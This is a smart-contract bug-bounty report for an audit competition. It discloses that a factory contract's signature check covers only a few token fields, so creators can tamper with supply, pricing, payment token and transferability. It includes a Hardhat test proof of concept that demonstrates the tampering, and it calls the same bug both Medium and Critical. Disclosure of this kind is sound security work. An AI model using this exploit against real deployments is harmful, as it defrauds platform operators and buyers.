# 57875 sc medium signature bypass lets creators alter key accesstoken parameters before deployment

**Submitted on Oct 29th 2025 at 10:43:56 UTC by @spongebob for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57875
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol>
* **Impacts:**
  * Unauthorized minting of NFTs

## Description

`SignatureVerifier.checkAccessTokenInfo` only signs `name`, `symbol`, `contractURI`, and `feeNumerator`. Every other field in `AccessTokenInfo` is omitted from the hash, so a signature remains valid after mutating payment terms, transferability, supply, pricing, or expiry data before submission (<https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/utils/SignatureVerifier.sol#L49>).

`Factory.produce` trusts the caller-supplied struct after that limited check and forwards it verbatim into the `AccessToken` initializer, only normalizing `paymentToken == address(0)` to the default currency:

* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/platform/Factory.sol#L236>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/platform/Factory.sol#L270>

The `AccessToken` proxy persists and enforces all of those unsupervised fields (royalties, `paymentToken`, prices, `transferable`, `maxTotalSupply`, etc.) for minting, transfers, and payments, with no further validation against a signed payload:

* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/tokens/AccessToken.sol#L130>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/tokens/AccessToken.sol#L149>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/tokens/AccessToken.sol#L174>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/tokens/AccessToken.sol#L303>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/tokens/AccessToken.sol#L374>

A malicious creator can therefore take an approved signature, alter unchecked fields (e.g., switch `paymentToken`, lift the supply cap, toggle transferable) and deploy a collection that violates the off-chain approval assumptions — effectively bypassing the policy the signature was meant to enforce.

No subsequent on-chain step revalidates or constrains those parameters, so the platform currently depends entirely on caller honesty for critical configuration.

## Impact

{% hint style="danger" %}
This is a Critical-severity attack path in practice: unchecked fields include `maxTotalSupply`, `transferable`, pricing, etc. A creator with an approved signature can mutate these before calling `produce`, allowing them to mint or configure collections in ways the signer never approved (e.g., removing a supply cap or flipping transferability). The signature remains valid because it doesn't cover those fields, so the factory cannot distinguish the tampered payload.
{% endhint %}

The realistic likelihood is high. The platform already issues signatures to creators, and the code doesn’t bind those signatures to the critical fields. Any creator who gets an approval can tweak unsigned parameters locally before calling `produce`. No extra privileges or technical skill are required — just a script or manual transaction edit.

## Recommendation

{% hint style="info" %}
Expand the signed digest in `checkAccessTokenInfo` to cover every `AccessToken` field that must stay immutable (payment token, transferability, supply, prices, expiry, etc.), or alternatively recompute and validate that complete digest inside `Factory.produce` before deploying.
{% endhint %}

## Proof of Concept

Run this diff

```diff
diff --git a/hardhat.config.ts b/hardhat.config.ts
index 5023728..3e67baf 100644
--- a/hardhat.config.ts
+++ b/hardhat.config.ts
@@ -1,4 +1,5 @@
 import { HardhatUserConfig } from 'hardhat/config';
+import type { HardhatNetworkUserConfig } from 'hardhat/types';
 import '@nomicfoundation/hardhat-toolbox';
 import '@openzeppelin/hardhat-upgrades';
 import 'solidity-docgen';
@@ -12,6 +13,7 @@ dotenv.config();
 
 let accounts: string[] = [],
   ledgerAccounts: string[] = [];
+const shouldFork = !process.env.NO_FORK;
 
 if (process.env.PK) {
   accounts = [process.env.PK];
@@ -20,6 +22,23 @@ if (process.env.LEDGER_ADDRESS) {
   ledgerAccounts = [process.env.LEDGER_ADDRESS];
 }
 
+const forkingUrl = process.env.INFURA_ID_PROJECT
+  ? `https://mainnet.infura.io/v3/${process.env.INFURA_ID_PROJECT}`
+  : `https://eth.llamarpc.com`;
+
+const hardhatNetworkConfig: HardhatNetworkUserConfig = {
+  accounts: { accountsBalance: '10000000000000000000000000' },
+  initialBaseFeePerGas: 0,
+  allowUnlimitedContractSize: false,
+};
+
+if (shouldFork) {
+  hardhatNetworkConfig.forking = {
+    url: forkingUrl,
+    blockNumber: 23490636,
+  };
+}
+
 const config: HardhatUserConfig = {
   solidity: {
     compilers: [
@@ -35,18 +54,7 @@ const config: HardhatUserConfig = {
     ],
   },
   networks: {
-    hardhat: {
-      forking: {
-        url: process.env.INFURA_ID_PROJECT
-          ? `https://mainnet.infura.io/v3/${process.env.INFURA_ID_PROJECT}`
-          : `https://eth.llamarpc.com`,
-        blockNumber: 23490636,
-      },
-      // throwOnCallFailures: false,
-      accounts: { accountsBalance: '10000000000000000000000000' },
-      initialBaseFeePerGas: 0,
-      allowUnlimitedContractSize: false,
-    },
+    hardhat: hardhatNetworkConfig,
     // 'ethereum': {
     //   url: 'https://eth.drpc.org',
     // },
diff --git a/test/v2/platform/factory.test.ts b/test/v2/platform/factory.test.ts
index 58a94c2..7236ba8 100644
--- a/test/v2/platform/factory.test.ts
+++ b/test/v2/platform/factory.test.ts
@@ -267,6 +267,67 @@ describe('Factory', () => {
       expect(shares[2]).to.eq(0);
     });
 
+    it('allows tampering unsigned AccessToken fields before deployment (PoC)', async () => {
+      const { factory, erc20Example, signer, alice } = await loadFixture(fixture);
+
+      const approvedName = 'Curated NonTransferable Drop';
+      const approvedSymbol = 'CUR8';
+      const approvedContractURI = 'ipfs://approved';
+      const approvedRoyalty = 250;
+      const approvedMaxSupply = BigNumber.from('5');
+      const approvedTransferable = false;
+
+      const digest = hashAccessTokenInfo(
+        approvedName,
+        approvedSymbol,
+        approvedContractURI,
+        approvedRoyalty,
+        chainId,
+      );
+      const signature = EthCrypto.sign(signer.privateKey, digest);
+
+      const approvedInfo: AccessTokenInfoStruct = {
+        metadata: { name: approvedName, symbol: approvedSymbol },
+        contractURI: approvedContractURI,
+        paymentToken: NATIVE_CURRENCY_ADDRESS,
+        mintPrice: ethers.utils.parseEther('0.01'),
+        whitelistMintPrice: ethers.utils.parseEther('0.005'),
+        transferable: approvedTransferable,
+        maxTotalSupply: approvedMaxSupply,
+        feeNumerator: approvedRoyalty,
+        collectionExpire: BigNumber.from('0'),
+        signature,
+      };
+
+      const tamperedInfo: AccessTokenInfoStruct = {
+        ...approvedInfo,
+        paymentToken: erc20Example.address,
+        transferable: true,
+        maxTotalSupply: BigNumber.from('1000'),
+        mintPrice: ethers.utils.parseEther('1'),
+        whitelistMintPrice: ethers.utils.parseEther('0.25'),
+        collectionExpire: BigNumber.from('123456789'),
+      };
+
+      const predictedAddress = await factory
+        .connect(alice)
+        .callStatic.produce(tamperedInfo, ethers.constants.HashZero);
+      await expect(factory.connect(alice).produce(tamperedInfo, ethers.constants.HashZero)).to.not.be.reverted;
+
+      const accessToken = await ethers.getContractAt('AccessToken', predictedAddress);
+      const deployedParams = await accessToken.parameters();
+
+      expect(deployedParams.info.transferable).to.equal(true);
+      expect(deployedParams.info.transferable).to.not.equal(approvedInfo.transferable);
+
+      expect(deployedParams.info.maxTotalSupply).to.equal(tamperedInfo.maxTotalSupply);
+      expect(deployedParams.info.maxTotalSupply).to.not.equal(approvedInfo.maxTotalSupply);
+
+      expect(deployedParams.info.paymentToken).to.equal(erc20Example.address);
+      expect(deployedParams.info.mintPrice).to.equal(tamperedInfo.mintPrice);
+      expect(deployedParams.info.collectionExpire).to.equal(tamperedInfo.collectionExpire);
+    });
+
     it('should correctly deploy several AccessToken nfts', async () => {
       const { factory, alice, bob, charlie, signer } = await loadFixture(fixture);
```
